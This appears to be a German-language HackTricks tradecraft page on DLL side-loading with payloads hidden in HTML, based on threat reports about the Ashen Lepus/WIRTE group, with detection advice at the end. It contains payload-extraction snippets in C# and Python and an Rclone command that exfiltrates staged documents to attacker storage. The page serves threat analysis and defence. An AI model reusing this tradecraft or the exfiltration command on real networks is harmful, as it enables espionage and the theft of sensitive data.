# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft-Überblick

Ashen Lepus (aka WIRTE) hat ein wiederholbares Muster genutzt, das DLL sideloading, staged HTML payloads und modulare .NET backdoors verknüpft, um in diplomatischen Netzwerken im Nahen Osten persistent zu bleiben. Die Technik ist von jedem Operator wiederverwendbar, weil sie auf Folgendem basiert:

- **Archive-based social engineering**: harmlose PDFs weisen Ziele an, ein RAR-Archiv von einer File-Sharing-Seite herunterzuladen. Das Archiv bündelt einen echt wirkenden Dokumenten-Viewer EXE, eine bösartige DLL mit dem Namen einer vertrauenswürdigen Bibliothek (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) und eine Lockvogel-Datei `Document.pdf`.
- **DLL search order abuse**: das Opfer doppelklickt das EXE, Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) läuft im vertrauenswürdigen Prozess, während die Lockvogel-PDF geöffnet wird, um Verdacht zu vermeiden.
- **Living-off-the-land staging**: jede spätere Stufe (AshenStager → AshenOrchestrator → modules) bleibt bis zur Nutzung vom Datenträger fern und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten verborgen sind.

## Multi-Stage Side-Loading Chain

1. **Decoy EXE → AshenLoader**: das EXE side-loadet AshenLoader, welcher Host-Recon durchführt, ihn mit AES-CTR verschlüsselt und per POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade sendet (z. B. `/api/v2/account`).
2. **HTML extraction**: der C2 gibt die nächste Stufe nur preis, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` mit dem Implantat übereinstimmt, wodurch Sandboxes umgangen werden. Wenn die Prüfungen bestanden sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
3. **Second sideload**: AshenStager wird zusammen mit einer weiteren legitimen Binärdatei bereitgestellt, die `wtsapi32.dll` importiert. Die in die Binärdatei injizierte bösartige Kopie holt mehr HTML und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64-kodierte JSON-Konfiguration decodiert. Die Felder `tg` und `au` der Konfiguration werden verkettet/gehasht und bilden den AES-Schlüssel, der `xrk` entschlüsselt. Die resultierenden Bytes fungieren als XOR-Schlüssel für jeden danach abgerufenen Modul-Blob.
5. **Module delivery**: jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen Persistenz (`PR*`), Deinstallationsprogramme (`UN*`), Aufklärung (`SN`), Bildschirmaufnahme (`SCT`) und Dateierkundung (`FE`).

### HTML-Container-Parsing-Muster
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angegebene Tag ändern, um die Auslieferung wieder aufzunehmen.

### Schneller Extraktionshelfer (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Parallelen zur HTML-Staging-Evasion

Recent HTML smuggling research (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen versteckt und zur Laufzeit via JavaScript decodiert werden. Derselbe Trick lässt sich für C2-Antworten wiederverwenden: verschlüssele Blobs und stage sie innerhalb eines script tags (oder eines anderen DOM-Elements) und dekodiere sie in-memory vor AES/XOR, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt außerdem geschichtete Obfuskation (Identifier-Renaming plus Base64/Caesar/AES) innerhalb von script tags, was sich sauber auf HTML-staged C2 blobs abbildet.

## Aktuelle Variantenhinweise (2024-2025)

- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archive-based sideloading setzten, aber `propsys.dll` (stagerx64) als erste Stufe verwendeten. Der stager dekodiert das nächste Payload mit Base64 + XOR (Key `53`), sendet HTTP-Anfragen mit einem hardcodierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Branch wurde die Stage aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die via `RtlIpv4StringToAddressA` decodiert und dann zu den Payload-Bytes konkatenieret wurden.
- OWN-CERT dokumentierte frühere WIRTE-Tooling, bei dem der side-loaded `wtsapi32.dll` Dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Decrypt-Key verwendete, bevor Host-Identifikationsdaten XOR/Base64-obfuskiert an den C2 gesendet wurden.

## Krypto- & C2-Härtung

- AES-CTR everywhere: aktuelle Loader betten 256-bit Keys plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht hinzu, wobei Strings wie `msasn1.dll` vor/nach der Dekryptierung verwendet werden.
- Key-Material-Variationen: frühere Loader nutzten Base64 + TEA, um eingebettete Strings zu schützen; der Decrypt-Key wurde aus dem bösartigen DLL-Namen abgeleitet (z. B. `wtsapi32.dll`).
- Infrastructure split + subdomain camouflage: Staging-Server sind pro Tool getrennt, über verschiedene ASNs gehostet und werden manchmal durch legitim aussehende Subdomains vorgelagert, sodass das Kompromittieren einer Stage nicht den Rest offenlegt.
- Recon smuggling: abgerufene Recon-Daten enthalten jetzt Program Files-Listings, um hochgradig wertvolle Apps zu identifizieren, und werden immer verschlüsselt, bevor sie das Host verlassen.
- URI churn: Query-Parameter und REST-Pfade rotieren zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Detections ungültig werden.
- User-Agent pinning + safe redirects: C2-Infrastruktur antwortet nur auf exakte UA-Strings und leitet sonst zu benignen News-/Health-Seiten weiter, um unauffällig zu wirken.
- Gated delivery: Server sind geo-gegrenzt und beantworten nur echte Implants. Nicht freigeschaltete Clients erhalten unauffälliges HTML.

## Persistence & Execution Loop

AshenStager legt geplante Tasks an, die sich als Windows-Wartungsjobs tarnen und über `svchost.exe` ausgeführt werden, z. B.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

Diese Tasks starten die sideloading-Kette beim Boot oder in Intervallen neu und stellen sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut die Festplatte zu berühren.

## Verwendung legitimer Sync-Clients zur Exfiltration

Operatoren stagern diplomatische Dokumente in `C:\Users\Public` (welt-lesbar und unverdächtig) über ein dediziertes Modul und laden dann das legitime [Rclone](https://rclone.org/) Binary herunter, um dieses Verzeichnis mit Angreifer-Speicher zu synchronisieren. Unit42 stellt fest, dass dies das erste Mal ist, dass dieser Actor Rclone zur Exfiltration beobachtet wurde, was dem breiteren Trend entspricht, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:

1. Stage: kopiere/sammle Ziel-Dateien nach `C:\Users\Public\{campaign}\`.
2. Configure: liefere eine Rclone-Konfiguration, die auf einen Angreifer-verwalteten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
3. Sync: führe `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` aus, sodass der Traffic normalen Cloud-Backups ähnelt.

Da Rclone weit verbreitet für legitime Backup-Workflows genutzt wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, ungewöhnliche Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).

## Erkennungsansätze

- Alarmieren bei signed processes, die unerwartet DLLs aus user-writable Pfaden laden (Procmon-Filters + `Get-ProcessMitigation -Module`), besonders wenn DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` übereinstimmen.
- Untersuche suspicious HTTPS-Antworten auf große Base64-Blobs, die in ungewöhnlichen Tags eingebettet sind oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt werden.
- Erweitere HTML-Hunting auf Base64-Strings innerhalb von `<script>`-Blöcken (HTML smuggling-style staging), die via JavaScript decodiert werden, bevor AES/XOR verarbeitet wird.
- Suche nach scheduled tasks, die `svchost.exe` mit non-service-Argumenten ausführen oder auf Dropper-Verzeichnisse verweisen.
- Verfolge C2-Redirects, die nur für exakte `User-Agent`-Strings Payloads zurückliefern und sonst zu legitimen News/Health-Domains weiterleiten.
- Überwache das Auftauchen von Rclone-Binaries außerhalb IT-verwalteter Orte, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)

{{#include ../../../banners/hacktricks-training.md}}
